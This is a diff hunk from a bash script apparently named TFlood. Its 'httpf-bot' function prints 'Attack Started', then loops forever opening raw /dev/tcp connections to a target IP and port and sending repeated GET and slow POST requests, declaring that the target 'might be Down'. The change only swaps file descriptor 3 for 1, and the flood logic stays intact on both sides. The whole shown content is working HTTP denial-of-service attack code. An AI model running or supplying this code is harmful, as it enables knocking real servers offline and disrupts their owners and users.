@@ -240,11 +240,11 @@ httpf-bot() {
 printf "${Green} Attack Started${NC}\n"
 while :
 do
-exec 3<>/dev/tcp/$mIP/$prt
-echo -ne "GET / HTTP/1.0\r\nHost: $mIP\r\n\r\n" >&3
-echo -e 'POST / HTTP/1.1\r\nContent-Type: application/json\r\nHost: $mIP\r\nAccept-text/xml,text/html,text/plain\r\nAccept-Language: em-us,en\r\nAccept-Encoding: gzip, deflate\r\nAccept-Charset: ISO-8859-1,utf-8\r\nKeep-Alive: 300\r\nConnection:keep-alive\r\n\r\n{\r\n"name": "TFlood"\r\n}\r\n\r\n' >&3
-echo -ne "POST / HTTP/1.1\r\nHost: $mIP\r\nConnection: keep-alive\r\nKeep-Alive: 900\r\nContent-Length: 10000\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n" >&3
-echo -e "GET / HTTP/1.1\r\nHost: $mIP\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n\r\n" >&3
+exec 1<>/dev/tcp/$mIP/$prt
+echo -ne "GET / HTTP/1.0\r\nHost: $mIP\r\n\r\n" >&1
+echo -e 'POST / HTTP/1.1\r\nContent-Type: application/json\r\nHost: $mIP\r\nAccept-text/xml,text/html,text/plain\r\nAccept-Language: em-us,en\r\nAccept-Encoding: gzip, deflate\r\nAccept-Charset: ISO-8859-1,utf-8\r\nKeep-Alive: 300\r\nConnection:keep-alive\r\n\r\n{\r\n"name": "TFlood"\r\n}\r\n\r\n' >&1
+echo -ne "POST / HTTP/1.1\r\nHost: $mIP\r\nConnection: keep-alive\r\nKeep-Alive: 900\r\nContent-Length: 10000\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n" >&1
+echo -e "GET / HTTP/1.1\r\nHost: $mIP\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n\r\n" >&1
 done
 printf "${Green}Target : $mip might be Down${NC}\n"
 }
